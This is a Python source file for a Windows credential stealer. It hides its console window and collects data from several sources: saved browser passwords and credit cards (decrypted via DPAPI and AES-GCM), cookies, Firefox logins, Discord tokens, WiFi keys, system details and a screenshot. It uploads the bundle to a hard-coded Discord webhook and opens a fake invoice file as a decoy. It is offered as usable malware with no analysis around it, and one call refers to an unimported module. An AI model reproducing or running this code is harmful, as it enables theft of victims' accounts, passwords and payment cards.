import os
import json
import requests
import threading
import tempfile
import zipfile
import subprocess
import sqlite3
import shutil
import win32crypt
import base64
import re
import sys
import platform
import socket
from datetime import datetime
from Crypto.Cipher import AES
import ctypes

WEBHOOK = "https://discord.com/api/webhooks/1529972286671814828/DsREj38ZscfwOleZ57wGcTwgGAg0K5M5nwsrspJ7jLlHTc4qetNQFg8ly-Z_TWKFadDY"

# Hide console
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# ---------- Helper: get Chrome key ----------
def get_chrome_key():
    try:
        local_state = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Local State')
        with open(local_state, 'r', encoding='utf-8') as f:
            data = json.load(f)
        encrypted_key = base64.b64decode(data['os_crypt']['encrypted_key'])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_password(encrypted, key):
    try:
        nonce = encrypted[3:15]
        ciphertext = encrypted[15:-16]
        tag = encrypted[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
    except:
        try:
            return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8')
        except:
            return ""

# ---------- 1. Cookies ----------
def steal_cookies():
    data = {}
    try:
        import browser_cookie3
        for name, func in [("chrome", browser_cookie3.chrome), ("firefox", browser_cookie3.firefox),
                           ("edge", browser_cookie3.edge), ("opera", browser_cookie3.opera),
                           ("brave", browser_cookie3.brave)]:
            try:
                cj = func(domain_name='.')
                data[name] = [{'name': c.name, 'value': c.value, 'domain': c.domain} for c in cj]
            except:
                pass
    except:
        pass
    return data

# ---------- 2. Passwords ----------
def steal_passwords():
    passwords = {'chrome': [], 'edge': [], 'brave': [], 'firefox': [], 'opera': []}
    browsers = [
        ('chrome', os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')),
        ('edge', os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')),
        ('brave', os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Login Data'))
    ]
    key = get_chrome_key()
    if key:
        for name, path in browsers:
            if os.path.exists(path):
                try:
                    tmp = os.path.join(tempfile.gettempdir(), f'{name}_pass.db')
                    shutil.copyfile(path, tmp)
                    conn = sqlite3.connect(tmp)
                    c = conn.cursor()
                    c.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for row in c.fetchall():
                        url, user, enc = row
                        if user and enc:
                            dec = decrypt_password(enc, key)
                            if dec:
                                passwords[name].append({'url': url, 'username': user, 'password': dec})
                    conn.close()
                    os.remove(tmp)
                except:
                    pass
    # Firefox
    try:
        ff_path = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
        if os.path.exists(ff_path):
            for profile in os.listdir(ff_path):
                logins = os.path.join(ff_path, profile, 'logins.json')
                if os.path.exists(logins):
                    with open(logins, 'r') as f:
                        data = json.load(f)
                        for entry in data.get('logins', []):
                            passwords['firefox'].append({
                                'url': entry.get('hostname', ''),
                                'username': entry.get('usernameField', ''),
                                'password': entry.get('password', '')
                            })
    except:
        pass
    return passwords

# ---------- 3. Credit Cards ----------
def steal_credit_cards():
    cards = {'chrome': [], 'edge': [], 'brave': []}
    browsers = [
        ('chrome', os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Web Data')),
        ('edge', os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Web Data')),
        ('brave', os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Web Data'))
    ]
    key = get_chrome_key()
    if key:
        for name, path in browsers:
            if os.path.exists(path):
                try:
                    tmp = os.path.join(tempfile.gettempdir(), f'{name}_cards.db')
                    shutil.copyfile(path, tmp)
                    conn = sqlite3.connect(tmp)
                    c = conn.cursor()
                    c.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                    for row in c.fetchall():
                        name_on, month, year, enc = row
                        if enc:
                            dec = decrypt_password(enc, key)
                            if dec:
                                cards[name].append({
                                    'name': name_on,
                                    'card_number': dec,
                                    'exp_month': month,
                                    'exp_year': year
                                })
                    conn.close()
                    os.remove(tmp)
                except:
                    pass
    return cards

# ---------- 4. Discord Tokens ----------
def steal_discord_tokens():
    tokens = []
    paths = [
        os.path.join(os.environ['APPDATA'], 'Discord', 'Local Storage', 'leveldb'),
        os.path.join(os.environ['APPDATA'], 'DiscordPTB', 'Local Storage', 'leveldb'),
        os.path.join(os.environ['APPDATA'], 'DiscordCanary', 'Local Storage', 'leveldb'),
        os.path.join(os.environ['LOCALAPPDATA'], 'Discord', 'Local Storage', 'leveldb')
    ]
    for p in paths:
        if os.path.exists(p):
            for f in os.listdir(p):
                if f.endswith('.log'):
                    try:
                        with open(os.path.join(p, f), 'r', errors='ignore') as file:
                            content = file.read()
                            matches = re.findall(r'([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27})', content)
                            tokens.extend(matches)
                    except:
                        pass
    return list(set(tokens))

# ---------- 5. System Info ----------
def steal_system_info():
    info = {
        'user': os.environ.get('USERNAME', ''),
        'computer': os.environ.get('COMPUTERNAME', ''),
        'os': platform.system() + ' ' + platform.release(),
        'arch': platform.machine(),
        'hostname': socket.gethostname()
    }
    try:
        info['ip'] = requests.get('https://api.ipify.org', timeout=3).text
    except:
        info['ip'] = 'unknown'
    return info

# ---------- 6. WiFi Passwords ----------
def steal_wifi():
    wifi = []
    try:
        output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], encoding='utf-8')
        profiles = re.findall(r'All User Profile\s*:\s*(.*)', output)
        for prof in profiles:
            prof = prof.strip()
            try:
                details = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', prof, 'key=clear'], encoding='utf-8')
                pwd = re.search(r'Key Content\s*:\s*(.*)', details)
                if pwd:
                    wifi.append({'ssid': prof, 'password': pwd.group(1).strip()})
            except:
                pass
    except:
        pass
    return wifi

# ---------- 7. Screenshot ----------
def steal_screenshot():
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        path = os.path.join(tempfile.gettempdir(), 'screenshot.png')
        img.save(path)
        return path
    except:
        return None

# ---------- 8. Send Everything ----------
def send_all():
    try:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        tmp = tempfile.gettempdir()
        data = {
            'cookies': steal_cookies(),
            'passwords': steal_passwords(),
            'credit_cards': steal_credit_cards(),
            'discord_tokens': steal_discord_tokens(),
            'system_info': steal_system_info(),
            'wifi_passwords': steal_wifi(),
            'timestamp': ts
        }
        json_path = os.path.join(tmp, f'data_{ts}.json')
        with open(json_path, 'w') as f:
            json.dump(data, f, indent=2)

        zip_path = os.path.join(tmp, f'steal_{ts}.zip')
        with zipfile.ZipFile(zip_path, 'w') as z:
            z.write(json_path, os.path.basename(json_path))
            sc = steal_screenshot()
            if sc and os.path.exists(sc):
                z.write(sc, 'screenshot.png')
                os.remove(sc)

        with open(zip_path, 'rb') as f:
            requests.post(WEBHOOK, files={'file': (f'steal_{ts}.zip', f)}, timeout=20)

        os.remove(json_path)
        os.remove(zip_path)
    except Exception as e:
        pass

# ---------- Run ----------
threading.Thread(target=send_all, daemon=True).start()

# Open fake invoice on desktop
try:
    desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    fake = os.path.join(desktop, 'Invoice_2026.txt')
    with open(fake, 'w') as f:
        f.write("INVOICE #2026\nStatus: PAID\nTotal: $0.00\nThank you!")
    os.startfile(fake)
except:
    pass

time.sleep(12)   # give time to exfiltrate